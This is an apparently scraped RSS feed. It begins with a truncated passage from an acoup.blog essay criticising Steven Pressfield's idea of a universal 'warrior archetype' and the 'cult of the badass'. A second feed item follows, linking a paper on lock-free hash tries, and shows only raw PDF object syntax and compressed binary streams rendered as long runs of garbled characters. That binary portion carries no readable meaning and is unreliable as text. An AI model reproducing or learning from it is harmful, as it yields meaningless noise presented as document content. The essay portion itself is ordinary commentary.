<p>And I should note this is something we could demonstrate in more than a half-dozen different ways deploying just a fraction of the available scholarship on how the experience and values of war change from place to place.  Indeed, that is essentially what we have done.  <strong>Any <em>one</em> of the above points is enough to be fatal to the notion that there is some sort of ‚Äòuniversal‚Äô set of warriors values and experiences </strong>such that, as Pressfield openly states, a Spartiate could be simply dropped into a modern U.S. Marine regiment and fit in without skipping a beat (or his equally anachronistic notion that the decadent Athenian could be dropped into American civil society and also integrate seamlessly).  </p>



<p>But of course Pressfield isn‚Äôt offering a <em>history</em> (and indeed, he has not written one), he is offering an ideology and (intentionally or not) reshaping the historical facts to fit that ideology, shaving the corners off of the square peg so it will fit into the round hole of his moral assumptions.  His ideology requires a universal set of warrior values to serve as the foundation for his life philosophy and so, facts be damned, he <em>will</em> assert the existence of such a universal set of values.  The ideology, not the history, is the foundation, which is why Pressfield offers both anecdotes from Plutarch (a historical source) and his own books (modern historical fiction) as having equal truth value, even though the latter has no value as historical evidence; they both <strong>express the ideology</strong>.</p>



<p>So what is the ideology here?  Well, for that it is time to meet our old friend‚Ä¶</p>



<h2>The Cult of the Badass</h2>



<p>Pulling out the core ideology from Pressfield‚Äôs <a href="https://stevenpressfield.com/category/the-warrior-archetype/">videos </a>is a formidable task; there are fifty of them and so much of the core argument is submerged beneath endless anecdotes (some historical, some Pressfield openly invented for his historical fiction; all delivered with insufficient historical context).  But Pressfield‚Äôs videos are useful for this argument because he makes explicit a set of arguments which are usually only made <em>implicitly</em> through a set of emotional appeals which often are carried through the subtext of images and references rather than the text of what is being said.</p>



<p>(Marching through Pressfield‚Äôs videos was also frankly difficult because there are <a href="https://twitter.com/BretDevereaux/status/1350655580562731011"><em>just so many errors</em> </a>in them, I had to stop live-tweeting my way through them because if I kept doing it I‚Äôd never finish.  As a reminder, this is a fellow whose fiction<a href="https://en.wikipedia.org/wiki/Gates_of_Fire"> is on reading lists </a>at various U.S. military officer training programs, much to my continued sorrow.)</p>



<p>We may, I think, summarize Pressfield‚Äôs core argument as follows: the ‚Äòwarrior archetype‚Äô (he is using here the long-abandoned psychology of Carl Jung) represents a true human universal best understood by certain ‚Äòwarrior societies‚Äô (<em>especially</em> the Spartans, but also Alexander III, but somehow <em>not</em> the Macedonians or Philip II) who supposedly demonstrated martial excellence and who therefore are ‚Äúrepresentative of the purest expression of the warrior archetype‚Äù (his words).  Moreover, Pressfield argues that this understanding of the ‚Äòinner warrior‚Äô provides the best blueprint on which a person might fashion their lives, understanding their weaknesses as an ‚Äòinner enemy‚Äô that must be opposed by ‚Äòwarrior values‚Äô and ‚Äòmental toughness.‚Äô  And while Pressfield will admit that the ‚Äòwarrior archetype‚Äô can go astray (he says this of Alexander, though I‚Äôd argue that Alexander didn‚Äôt so much ‚Äògo astray‚Äô as he ‚Äòkept doing what he had done literally for his entire life, but began doing it to people who thought Alexander would only hurt people <em>they didn‚Äôt like</em>‚Äò), he nevertheless presents this ‚Äòwarrior archetype‚Äô as an expression of the highest possible human ideal.  <strong>In Pressfield‚Äôs ideological framework, it is the great warriors ‚Äì the Spartans, Alexander, Arjuna ‚Äì who stand atop the summit of human physical and moral achievement.</strong>  Non-warriors (mostly women) are valued in as much as they uphold elements of this warrior ideal so that warriors (mostly men) can give those ideals physical expression in action.  Even internal struggles must be reframed as a form of war, to be fought and defeated with the same values that best produce effective real-world violence.</p>


</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/">https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/02/19/collections-the-universal-warrior-part-iii-the-cult-of-the-badass/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190353</guid>
            <pubDate>Fri, 19 Feb 2021 06:29:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cache-Tries: O(1) Concurrent Lock-Free Hash Tries (2018) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190123">thread link</a>) | @feniv
<br/>
February 18, 2021 | http://aleksandar-prokopec.com/resources/docs/p137-prokopec.pdf | <a href="https://web.archive.org/web/*/http://aleksandar-prokopec.com/resources/docs/p137-prokopec.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>&lt;435D0B962E4D6E4F887B1123181692F0&gt;]/Index[1866 106]/Info 1865 0 R/Length 151/Prev 963274/Root 1867 0 R/Size 1972/Type/XRef/W[1 3 1]&gt;&gt;stream
h√ûbbd```b``¬µ‚Äò@$¬£ÀÜd≈°"O‚Ç¨H√ß' ‚Äô√π!ÔøΩd\‚Ä∫b¬≥¬¨‚ÄπHÔøΩ√â√á √±¬∏.¬∞√∏b0¬πL¬∫‚Ç¨H¬Æ	 √ô≈í‚Ä°`‚Äò`√ª¬ØX√óB¬∞¬Ω√≥A"¬¨¬¨`v+XM ÀÜ√îz
f_‚ÄúB`√µ¬Ω ‚Äô√Ω#Àú√≠"√ó∆íe√â√ü√Ü√≤L≈í√¨¬∑√Ä¬æ``%5√π≈∏√°w√ä.‚Ç¨j≈†
endstream
endobj
startxref
0
%%EOF
                                                                                                                                   
1971 0 obj
&lt;&gt;stream
h√ûb```¬¢.≈æG√Ç √å√Ä√ä√Ä√Ü√Ä√Ç√Ä√Å√∂√ò‚Ç¨,√Ç‚Äî√õ¬æ√ä√ª√û≈°√π√≠ÔøΩ¬ßt{√ò¬¥√¨√ø`√áyw‚Äò√ø≈æ)ÔøΩ¬Ø‚Ç¨√¶-;0¬°¬°o¬≥√¥y√ªoo‚ÄìÀú50 AV∆í√ßM¬¥‚Ä°v¬®?me_√ê√•√¶(‚Äú¬¨0¬≥¬´√¶√∞
‚Äú√¥K√¶ED¬≤8√∫i√æ√±1ir√´√π¬¢‚Äì"√àZ/√î¬°√≤Ey√Ü√°UK¬Ør\¬∏√â√¢√®u,√£¬æ√Çd¬´Un√≥√ö‚Ç¨√ö¬Ω√™2√éN√¨¬±h≈†k√í√îZ√≤E‚Äô√Ö√ëW3√†√òt‚Ä∞¬∏‚Ä†/√≤=M√Æ/√ïh¬¨^5√çQ √∫ÔøΩ¬¥√§∆í√á^¬æ¬®¬∂T√ùkh≈†√Ø√ë^‚Ä∫"‚Äú √¨6MZ^3√ü¬°√õ]√•√Ω‚Äú@&amp;h$¬¥‚Ä°√ò√Ñ√∑Ex¬®≈æ√ó8√ÅE¬§√âWl2Àú√¥P√π√Ç¬´-√æ√®6‚Ä¶9^¬∂√¨ÔøΩM‚Äô√π8√ä¬§@¬º((
√∑¬≥&nbsp;`h(Àú√É¬§√äA%%&nbsp; ¬£ÔøΩ¬≤‚Ä∞‚Äπ[ZZX¬•1‚Ç¨T2
‚Äö‚Ç¨¬∞YRÀú	
)¬•A≈í¬≤√Ä√Ä)T‚Ñ¢ÔøΩ√Å¬¶2(¬©¬∏¬∏¬∏x‚Ç¨XP4¬™M√â%¬¥ÔøΩÀúX:4ÔøΩÔøΩ¬ßPÔøΩÔøΩudd¬∏√ú√º√µ‚Äû]‚Äö<kr√ó‚Äì √Üo√´√é4¬¨i[`j√†√≥w√∂‚Äì#l#^745x:h3,~√Åz‚Ä†y‚Äò√ëÔøΩ¬±ÔøΩa{√∑√ë6¬ª@‚Ä†‚Ä∫="" ^√è¬∫h="" ¬∞√∂√ë√ø!√µ‚Ä°√°2∆í^√É="" √ë="" b6,="" |="" √åÔøΩ‚Äú√†√æb¬™f√†√ãÔøΩ√π‚ÄöÔøΩÔøΩ5√à¬Øa√†+9="" √§¬≥10¬®√ªÔøΩ√π-="" |√´√ò="" √≤lzÔøΩÔøΩ√ê≈°√Ä√§="" endstream="" endobj="" 1867="" 0="" obj="" <<="" metadata="" 642="" r="" names="" 1900="" openaction="" 1868="" outlines="" 1261="" pagelayout="" singlepage="" pagemode="" usenone="" pages="" 1861="" type="" catalog="">&gt;
endobj
1868 0 obj
&lt;&gt;
endobj
1869 0 obj
&lt;&gt;/ProcSet[/PDF/Text]&gt;&gt;/Rotate 0/Type/Page&gt;&gt;
endobj
1870 0 obj
&lt;&gt;stream
h√û√î[iSG√Ω√ª√™¬£√™¬∫/bC‚Ç¨‚Äûd√à¬≤W¬´p√ê@¬Ø‚Ä°&lt;3√òb√Ω¬æW√ù√É√å&nbsp;y¬ΩGM5}Teee¬æ|‚Ñ¢√ï√®¬¨‚ÄùPBg¬•√±‚Äπ¬≠√ö≈æXar√¢‚Ä∞√é‚ÄîG¬º8pD4√•$≈†√§O‚Äô√à¬°\A¬™¬º¬¶√±≈†1‚Äìg√®√ö:√á3&lt;√´"_√ê¬∏ty7b(w¬ßd‚ÄûQÔøΩc√™(≈í√é√•Z√Ü‚ÄìQ!¬ßq‚Äò√≤%≈í/¬£-L4|√éaR√§s√ú¬™2/√£‚Äû√ï&amp;√≤√åtR¬Æam√ª\√ñ‚Ä¢1L6‚Ñ¢√ë‚Ä¢ÔøΩ≈Ωw¬≠6¬æk¬µpZQ*k‚Äûs≈æ√£Z+\¬´√´‚ÄûW≈†√≥¬∞^x‚Ä∫√ä¬µ |.√£√ö(‚Äö¬µ√•n√Å√•√ís√ÅG√™√ö)bbN√£,Str√ë¬ª¬≥"j]¬Æ9(&gt;QRÀÜ},o`1r‚Ñ¢‚Ä°√Éj√òT≈æK"yW√é¬≤H!¬±t‚Ä¢r‚Ñ¢¬¶¬≠√≥]o√¶√á√æ¬º√ÖYY√Øz¬¢√å√ûsQ)¬≥"√ß¬¢!ÔøΩJ‚Äî¬•√°√º‚Ä¢+√í√∏¬≤√™\√ù√å[¬∏√åq√î¬π√ãU√º√í‚Äì/√ß¬±t+:W]G√á√ï&nbsp;√±√®¬§√ã)4‚Äö5¬ß^¬®v√ì¬Ω‚Ä†L¬•3≈í¬©y5b4√´a¬≥√π‚Äπ|VÔøΩ'c√º	-+q√¥√¥).√≠√≤√≤W7¬Ω√ã¬∫√í√æky,_O‚Ä†O≈∏√ä¬Ω√°√®¬º}&nbsp;√•¬´ÔøΩr√ø∆ínO^√äo√§Q}6√π‚Ç¨TÀú&amp;L*V\lmT√•¬∞√î&amp;¬•√ä8√ΩQ√ü≈æN√Ænjy√ò~‚Äì'&lt;√õ‚Ä†‚Äú√ªAÔøΩ√•¬ª¬£o¬∫g‚Äúf8√†√ü_]M&amp;7√£)√è‚Ä°M5]J≈Ω¬¢ÔøΩ‚ÄîV√á√§R¬¨J‚Ä∫√ì√ó+$√Ñ&lt;‚Ä¶≈æ‚Äî√ê√π*√Ä√ê¬¶≈°l*√Ñ√¶&gt;√ª√™¬¨‚Ñ¢√î√ï¬≥√∫¬∞¬∑7jz∆í√≥^3√û√°J√Æ¬ø√õA√∑¬∂T‚Ä¢6?¬¶:
6¬Ø:c&amp;U‚Ä¢¬•|√ì√Ç√ö‚Äî*¬Ø√º√ø‚Ç¨√¶¬º¬≠√®¬¶√∫¬¢¬Ω'¬ß¬©t√¥¬´¬¨9¬Ø{√Ω¬´√û√∏j¬≠8*@‚Ç¨√èv$≈ì5U√éDSS‚Ä¶ÔøΩ√á√Ω√á√≠√π√ù6CZX@‚ÄûcZ‚Ç¨‚Äûs¬¶2p¬®√≠=‚Äûi\√Ç.‚Äô√ùfh√ß*√¢√∫√Ω√ê6√ò√ün√®√ßo≈∏=√ª√¶√®√§‚Ä∞1f,√ºAC|¬§√ßz√°‚Äù¬≠,¬∞√¶\‚Ä¶‚Äù7√¢√≠h√∏√≥√∞¬¶&gt;3J√´m‚Ä†¬Æ√¢h&gt;UZ‚Äû‚Ñ¢*"L√π¬™h√ù√Ü∆í‚Ä°ÔøΩ¬¥√è√õ≈í√´¬°y‚Äû√µ.T¬±√é{ÔøΩÔøΩ¬´b√ú|√ñ7√ù¬¨¬µ9‚Ä∫≈í≈°z¬º√ç√ö+√å√±¬ø#√Ç%&amp;≈Ω8√°a{√âl&gt;√±√ùQ√ù√¥√Ü;P¬∫√õ√ô~¬∏c	‚ÄùX√ö¬∑QÀÜ√ñ+√ÑÀÜ≈Ω-@
‚Äò≈í-H√àHv_≈æ√¨‚Ç¨.p¬∂j√õ¬∞ÔøΩD],¬π‚Äî√à√ÑJ√π√≠%√∫v√ò≈í¬Øz¬≠≈Ω≈ΩO&nbsp;#¬æ√¥g‚Ä∫¬∑√±ÔøΩJ&lt;√ñYZ,¬¨$H¬π¬π@√á‚Äú¬∫≈ìG√µÀÜR√πÔøΩ7/_√≠Àú√§‚Äö{e‚Äôv&nbsp;`[y¬∞‚Ä°≈æ`C`	N√¶T¬®¬∞√º√å≈æ¬Ω¬πX/√´Q¬ø¬π¬∫∆íH*√≠√¨¬æz¬ª¬£√°‚Äö*√§-√ë;ÔøΩ√í¬∞√ç‚Äò√∏
#√© √Ñ7√•¬¥w√π[√ù√ØC¬µÔøΩ√Å`√¢≈ì√çfÔøΩQ√°L¬¥√ë√¶≈í√êj6√Ω√ç√∏√™¬∫7√†√í√òÔøΩ√£√É√ΩC√¢jsU√ö¬∏‚Ä¢Dtk7'√µ¬ß√öV¬¢/Wo2&nbsp;√ë√é‚Ä†√ó`¬∞√≠√∞¬ø√•@¬Æ+≈∏√ÇLl‚Äö3√ø√ó¬∏k@¬º¬¨√ï ^‚Ç¨|¬¨‚ÄòS¬∂√®
‚Äô√æ√ëk√¢"√Ä‚Ñ¢‚ÄûÔøΩwz¬§$ed√≤&amp;√¶*√©?|tk+√áD≈ΩW1%AF¬£√âE7[ÔøΩ√±√≠√©¬∏.|¬≥√ú"Up`ÔøΩ‚Äû'm@¬∑√Äq\e≈†k#√ç√ø√ï√òf‚Äπ¬±i_√¢tloR‚Ä¢Àú√æ√æ≈Ω√≠¬∂√ë9√É‚Äô^√§]	&nbsp;√¨¬¢6√π¬øÔøΩ√©u√§g√ç¬¢r=8¬´√áL‚Äù?5√Ç*4}x≈†&lt;^_√∑√§√ï√ù√çU=ÔøΩ7√µ¬®≈æ√É}√•?√´√ëP¬µ≈ì√º6‚Äù‚Äú¬´Q]√ã‚Äπ√°√≠H^4¬ø√ñr√ú|‚Äô√£√∫W¬ºP7‚ÄîW9h√∞√†√ô¬∞?ÀÜ√†√•¬ÆQ√Æ√ãg√≤¬π&lt;@¬¢√Ö)ÀÜ√§¬°|%b‚ÄìoD2√≤√≥&gt;)√ä√∑"G√ô‚Äú¬ß√≤L≈æK!/√•‚Ä¢l√§?√§√è¬≤/¬Ø√•@√•ÔøΩ@¬Æ'Gr,'√≤V√æ*‚Äú≈∏√§ÔøΩ√º√ß√áv‚Äì√èg√É√≥fp√ô¬™x|V&amp;"√¢√π√Ω√û√ç√ã"≈ì&amp;√â√Ω¬´√û√®¬∏≈æ|%w¬ß‚Äö√ÖB$√π¬¶F¬æ√Ø√Ñ(√ì√®¬¥B‚Äò√ö^PkTY¬´‚Ç¨¬¢
≈†√ö√©m^√¢¬¢≈íVw7ÔøΩB‚Äπ√¥¬≠√Ç¬®¬∫I¬ßP¬™vnFE√ß_¬≥ÔøΩQf√±√ÑX-√∫¬Ω√ã¬±p√≤`8Àú√¨√≠
?}x‚Äöxc√Ñk‚Äô≈°U0√ÄÔøΩ√•√∂A√ì¬Ø‚Äò√ê√Ü√à√∫G¬π√≤¬∫w]√ã¬£√Ø^√Æ¬æy√±g√ò√ÖasZÔøΩ&amp;ÔøΩ√ÆdO~3√©√µ‚Ä∫¬≥√ù√Å%√ûQ√ú√≠√∫{VUZÔøΩ√≤]J1jn&amp;√É‚Äò√º¬°S$`√∂√©√ì‚Äò≈∏¬µ¬¶¬®∆í`i)XZ¬™√ò[¬∞√è¬ºGucA√é‚Ä°¬≠√∂√•(¬¥√ó
#¬•Om¬´g√Ø|√Æ0,&lt;¬ºfJ¬£K√´¬¨&nbsp;¬Ω"¬≤‚Ä†‚Ä†‚Äù+¬≤8i1&gt;‚Äö‚Äòg‚Ä¢¬±0√©(,R_‚ÄπY‚Äú∆í≈†√∏
√ü‚Ä∞x?&nbsp;o¬∂≈ì√¢(√∫1√•¬Ω√àb≈∏‚Äö¬¢Y)√Ü‚Ä¢√Éft¬§bi√Å√ôI‚Ä∫√ã$A√ìÀú√ß0√ôE¬¢¬ß]√¥√†¬§1√éÔøΩa√ß‚Äì%HQ√ä¬©ÔøΩI8H,1‚Äìc9‚Äô9FCwÔøΩ¬•?√§‚Äô√®√õ|‚Äû‚Ä¢√Ø√µ√Ü5‚Äîh√ç√íN=¬¢-^[hF√£	]√±xiq√õ¬∫&amp;:√¨u√èhc√Æ√ë‚Äû√¶&nbsp;√•√â√∞√ù&nbsp;A¬ß√Ö¬ºRy√∫√ûN√§√ª√¶|r5n¬´¬¢√ì√Ç√õ√†hY√é{√£+√ëB≈Ω√ÆwA √´√§/¬∑√ÉI}~≈†√≥ √è‚Ä°√Ω~oD¬∑)&gt;`s{wT≈ì√∞¬¶‚Ä°&gt;√ª√µEw6√™¬¨R√û√¥o√á¬´pL≈Ω√ª√∑K¬°‚Äî¬Ø‚Ä∫√î,√Ñ¬®√á¬•√ï‚Ä∫D√∂√Æa√§E‚Äôo√•wL^N√û√ä¬øvÔøΩ√≤N~X√πA√æ(¬≤‚Äì¬ß¬£√û√ô√è√µ‚Äû√¢‚Äπl¬ß¬∂s√∏&lt;√ä_¬∂B@5‚Ä°j√Ω¬∂b√µF¬£√°o¬≠√æ1√µ√ì√πy,LB≈æ√û√∂√ª√µd	A√è‚Ä†7w√≠√≠√≥√©√öN!¬µ¬µ≈†‚Äö¬¨√∑F¬±
√Ün¬Øa√µ√£√¶r0∆í√õ25&amp;√π√∑?ufQ√¨√•‚Äî√ô‚ÄôN
p√û√ñZ√Ñ√Æ`¬ª[‚Äú√ö√Å√ïZ√∏6&gt;v√∞
¬≥√ü√â,√Å√∑‚Ä∫¬Ø√û/√∫√∏J√¥Fh}¬ºMx{G¬®√§`√™√ù0
A‚Ç¨‚Ä∞√Å‚ÄòM0=0M¬±≈°≈íl&gt;√∏rPnVts{X$≈æ√è‚Ä¶gS√õ2_√Ø√û√π√úa√ê?√∂1=X¬±K,ÔøΩ√¢√∞‚Ä∞&amp;uE≈í,O √¨√∏√ò‚Ä†X\¬•\ ÔøΩ"qK‚Ä¶√Ä¬Æ8√ù¬∂¬©}√á√£√ô%¬∏s$`√é&gt;¬≤√ã`¬∏iT√ö{L√Ñ[¬º‚Ä∫[\&amp;¬æ;‚Äû=¬´7z¬∏√Ö3√ìp√ù‚Äò¬¨J`√±√Ä|¬Ø‚Ç¨√µ¬∏oq¬Ω:n!A≈Ω√®√ò¬Øb‚Äô‚Ä†¬æ√ù"¬¶¬ØZ√ØyHw√ãÔøΩ¬ÆW@¬∫√ü
√í√≥ZH¬´!]≈æ\√ï‚Äú≈æ√êQ¬≤A√ß√ó¬∑ÀÜ‚ÄùV√∂.≈°F+r√ï√ÄB¬πÔøΩ#√Ø¬™^¬≤=R‚Ä¢V¬∫√≥A√≤+&lt;‚Ä°;¬©¬¨rq√Å¬ª¬≤Z√¥¬Æ√£O√∂≈æ-h√ª√ãÔøΩ√¶¬∂¬∞‚Äù¬´:≈∏_√â¬¥¬º‚Äô+2/.√§c√ãÀú√Ω¬∫etj¬∂%√ñ¬™.¬©E¬Ω√èT¬™¬¶&nbsp;e√ç≈ìN¬≥x¬¢√°P¬¶R≈°¬©√îr\¬∑¬®√ì‚Äî√É√â√æ√ë√õ√ó≈ìO≈°√´√ï
M+¬©f√±^:≈°*3√¨√Ü√ç√Ω√ü3"sy&nbsp;Dg‚Ä¢√®√£¬≤‚ÄîT√∂¬°8√∏√ßÔøΩÔøΩÔøΩ‚ÄòÔøΩ,'?-Àú5√©√ñ√Ø¬£)ÀÜ#¬≤√æ√•√Æ¬∂√åR¬∫40¬∏Àú‚Ä°‚Ä¢,L¬æ\¬∂YXÔøΩ√ü√ÉY√§√≠√π√ß√∏l8¬™¬ø 'k}√ΩQN0√ê\V‚Ä†UX√ä√ä¬¶9‚Ñ¢Y√à√∑d‚ÄúG‚Äô¬≤≈ΩA‚Äù√ô‚ÄúG|If¬∂H√¶c√ø∆íÀÜ√ø√ìb√î≈∏√©¬´‚Ç¨‚Ä¢	\\√èB‚Äî√Ä%¬≥√ß√≥7¬ª√®NoÔøΩ_¬ø√ö√ù%≈†√¨5√É~√ís¬≤‚Ä¶G√ç *(√Ü‚ÄûÔøΩ¬π√∏T¬ø2ch√†√ñ‚Äò√Å‚Ä∞[¬∏%¬®w ¬™‚Äì$fI¬™G√†Q¬≤:$--¬∞√õ√ì‚Äô‚Äîb√©‚Ä°¬≠S)a‚Äôb,√£2√®2¬∏F√ç√¨A√òc√±.≈∏c0M√úL√ñXÔøΩ√∂&gt;‚Äî6_
‚Ä¶√ò‚Äû2Q]BCI¬∫¬∞ÔøΩ‚Ä∞ÀÜÔøΩ√âm¬ª@√∏?‚Ç¨a√ø ¬Æd¬≥√∏‚Ä∫[H.√è√à¬Øe@,Cos‚Äπ‚Ä†zA≈∏√ôoFv√¨T√â~]@fiÀú(√∫‚ÄìT√®¬∞5V¬≠√∑\√îp‚Ä∫√Ñ¬∑]√ºwk√á√™√∏√Ø√î√™T,√¶√ê¬≤|.¬¢‚Äî√ü!yÔøΩ¬¶"y√π¬Æ√†
ÀÜ‚Äöjq‚Ä¶√üÔøΩY√ê√Ü√ï√ò¬≤=o`~√≥9√ç4¬£yGY`%-~‚Ç¨\\Tk√á¬Ω¬æ√≠√í¬¨√í
i√π,√ë‚Ç¨¬°¬¢¬°‚Ä¢~√à4¬¢^t√£∆í‚Ä°√ØX$√ü,√∏√±m¬¶d#l√Ç√§K√ót‚Ä∫P¬∏j
‚Äò√ü¬©√ÄT¬ª"y(‚Äπ¬£!√∞√ôTL‚Äî¬≠‚Ä°√π9√ÆQ;&gt;√ß
?N≈æu√û3√ú)√º‚Äì√Ürg√Ö¬∫{¬∑P√•¬∑√£√ù‚ÄùK‚Ä¢√ÉÔøΩ‚Ñ¢¬ßÀÜ√≠h&amp;¬≤"‚Äô;'‚ÄöC&amp;√õ¬æM`√°√≥√è{¬≤m~&nbsp;≈í¬•‚Äì√¶¬≠‚Ñ¢3√Å√§Z√øi√í:<f√ΩaÔøΩ√µ√ª≈Ω6}√®rÔøΩm√à√ùa√°3≈∏ewn?&¬ßy+√ß√™√Çlv‚Äì!#¬π ¬™|iuw‚Äú="" f√´√ô%‚Ç¨="" t¬¢g√±09√§t√≤√ìo√æ√∞≈∏h,‚Ñ¢√Ñn‚Äú√ä√øfb√âÔøΩ="" k√ãx‚Äò√µ"¬±√ú*¬°√¥√ã‚Ä¶x√∑√π‚Äûr="f¬™k3√Ø‚Äî3¬®|√â#¬¢√ô=‚Äì√∑‚Äî√≥√Ö¬¶√ô≈∏]5≈†‚Ä¶¬©√≥√ì√æ√©pr5_¬•≈°√ñ¬°≈°√ëY¬ø">‚Äö&amp;√∂√´k√ñ≈°√ÅE3h&amp;w¬≤_ÔøΩ√á-i√¨/‚Ä∫¬≥^√®zÔøΩH;F√®O≈°‚Ä∫√æ]√á)!√ú	¬Ω¬πn√∫¬Ω√ë\H√ê~Uu6√≥‚Äû!p√Çbig)$√¨¬ø~√π¬∑g?√æy√≤i|¬∑‚Äô√ëy√≥xp≈°√•x≈°¬∏W‚Ä¶¬ø√±¬´X¬∂4‚Ä∫√Ç√ß√ñ)‚Äù√ç√Çr&lt;√∂√ú¬™∆í√¢√≤¬∏√ø√¶√â∆íq‚Ä¶√á√¥o√≥√∑¬ß¬µÔøΩ√•√ª‚Äì≈∏¬≠¬≤~N¬πK≈∏m&lt;"√∂√í√Öx√ó¬∫√∑v¬£√¢√ß¬∞¬¶ÔøΩ√ª_Q¬µ√µy~√¥T¬°s!√êUÔøΩ ¬∂≈íaÔøΩ≈í≈∏¬∑‚ÄîX√¨2mG*‚Äî¬∂√¨c0¬∑EXK‚Äû¬π|√¥√âm‚Ç¨√Ñ√èk√ë¬≥/√õ√ã‚Ä°¬°≈°_8H≈ì√ã√ß√Ñ‚Äì√á‚ÄöC√é/√ª√å√´V‚Äû‚Äî≈ìN√πG≈ì.√ô¬µN‚ÄîV√Üf‚Ä°-Mc"(rn√≥=~¬ø¬ª√å√Ép‚Äì¬ß9√û√ªny√¶√ã√ª√†d√á]B9√è¬¥ÔøΩ7-√∞,¬∑¬™&nbsp;sx√ÇÔøΩ¬∞z√É+‚Ä°E¬∑z√ø√æ`√∑√õ¬Ω¬•]‚Äò¬µ\√ão√Ä¬µ√°≈ì√ª11&amp;
7‚Äô√´d2¬πl:‚Äò3√ë¬ØhR%¬ºÔøΩk‚Äò-‚Ä¢4√É‚Äî¬∞0‚Ä¶≈ì¬∏u‚Ä†{|ÔøΩ¬°n√ï≈æR√°h¬©√¨9√≤/√Æ)¬©\≈æ)~√ãpÀÜÔøΩ`¬ÆX¬ø¬µ√∂≈æ\√ô√åb‚Ñ¢‚Ä†√©I	√§‚Ä†√ù√ÉÔøΩW√≠√Ü≈ì√ók¬±√∂¬∏Fss√Å",o(‚Ä¶J√°√Å‚Ä†√íc¬º&amp;√áuv√ñl(√π9¬¥√ßG√¢ÔøΩ√Ñ√£~¬ø√°!√ô√ê¬∫l‚Ä°√ç~≈í≈∏≈æ‚Äò/t√øQZ√´√ä≈æ¬¶Q√ùo√ß‚ÄûZ√≥C ¬Æ¬±UÔøΩ√º‚Äû2O√ú√ä√´¬≥√á2[‚Ñ¢9√àA¬πb‚Äπ√Ø√êD√π¬∞√í¬∫G]√º¬°I√∫¬Æ¬§√è√ø√ä&nbsp;√àL
√öa√ßD√®¬Ø√ÇxJ&gt;√ã√ø2√†J‚Äî*$3|√Äs7√≥~√¶(Àúf√â√ê‚ÄìY√∫¬≠HIxÔøΩ√•nBJ¬∞√æÔøΩ√ò√ô√öÔøΩ√ã√†¬∑√ò¬∏≈ì~9a¬≠¬¨?ÔøΩ√µ{√ó√≠Q√æ!u?√ø¬π√Ω¬º¬π/-√Ç√Ω≈Ω√û√üVV√∑‚Äìs√∞-√∑a√Ö√≥√à√¥√¶{≈ΩG]¬≠¬Ø‚Äú√Æ√ë¬Ø0¬¶¬ø¬¢x¬π√°¬Æ√°√™√™√ü≈°ÔøΩ√ÇR√ú&nbsp;¬∏√ô√∑k¬£Y√ª%√Ä≈†√™_Z*¬¶√Ø¬Ω√ªa√Ø√•¬¢¬£√º¬æ¬∫√Å¬¨Àú√î}¬ÆN\JL,u√Ä¬®‚Äôm¬°/¬∂√•?¬∞ √≥i≈°$Xmg√•?~√£√Ä√≤≈∏n√ì√å√ú√§(√è√´√º¬∞√º√á√ík@ÔøΩ∆í√øe√∂¬π:G[√æ√ª¬∑V:√öX√é‚Äû¬ª√®K√ß√¨b√πo√µ‚Äö√èCc√ú&nbsp;√í6√Ä¬¥6_¬π‚Ä¶√Ü
W√âJÀú
endstream
endobj
1871 0 obj
&lt;&gt;stream
x√ö¬§¬∑p%√ú√í5;['¬∂√≠‚Ä∞m√õ¬∂√≠L<qfb'√õ‚Ñ¢√ò¬∂m√õ√æ3√è√Ω√û{≈∏√ª√¢¬Ø¬Ø√û¬Øn√ï¬Æ¬≥√∂√Æ^√ù¬ª{√µ>uH	√•‚Ä¢h≈í√≠MD√≠lÔøΩi√©¬∏√í¬∂√í‚Ä†&amp;≈Ω√é¬∂&amp;V:F:FRRegk‚Äú√øtC¬™j√¢√®dag√ã√µO3!G√ß√èa√ßOk%g‚Ç¨≈ì‚Äò3‚Ç¨
√Ä√à√å√Ö√ä√Ç√Ö√ä`b`d√∫;;G.‚Ç¨≈í‚Ä¶‚Äò¬πÔøΩ‚Ä∞5@√â√ú√Ä√ë√û‚Ä†T√à√é√û√É√ë√Ç√å√ú√π¬ØX.√Æ‚Ç¨‚Ä†z√§√ç-¬¨-√¨√≠√¢ty;kk≈°¬≥‚Äî¬≥7¬±√º¬π√Ä√Ö√ñ√ò√Ñ&nbsp;l√¢h√£¬∞3Àú~≈°√ö¬πY√ò≈°DMLJv¬¶√én≈Ω&amp;≈∏√îF&amp;¬∂N&amp;N\√øF#&amp;/
&nbsp;3¬±5q4¬∞√à¬ªZ[√Ω‚Ä°%%√Ä√ç√Ç√ô√º‚Äú√Ø¬≥V&amp;√ÆF&amp;√∂¬Æ
0¬∞5√à‚Ä∞J√ø	√Ö¬ø‚Äô√π_¬∫3√∏¬´&amp;√Ü√ø √ºc'j√ßhf&nbsp;0wv¬∂√ß¬¢¬ß√ø√Ç√¥√èÔøΩ‚Äú)ÔøΩ¬≠‚Ä∞3√•¬ø9+}F√æ¬¨$3√ç≈∏‚Ä¢√•¬Ø‚Ä¢√µ¬Ø‚Ä¢√≠¬Ø‚Ä¢√Ω¬Ø‚Ä¢√£¬Ø‚Ä¢√≥√è√ä√à√∞√ó√∫√ô!√Ä?n√∂'√¥g=√ø√∏√è)√ì√øÀú√Ωg
¬§"¬∂√ÜBv66&amp;¬∂√éN0≈íc‚Äπ√è√¶≈°ÀúY√ò√Ç√ê√ø¬°R√∂¬∞70≈íML√øÔøΩe≈ì-√úZt≈í‚Ä†?≈∏~√ì√π,‚Ç¨¬±ÔøΩ¬≠¬µ√á¬ø√åe
lL√¥¬¢b√íj√™√Ç√î√ø.√É√ö
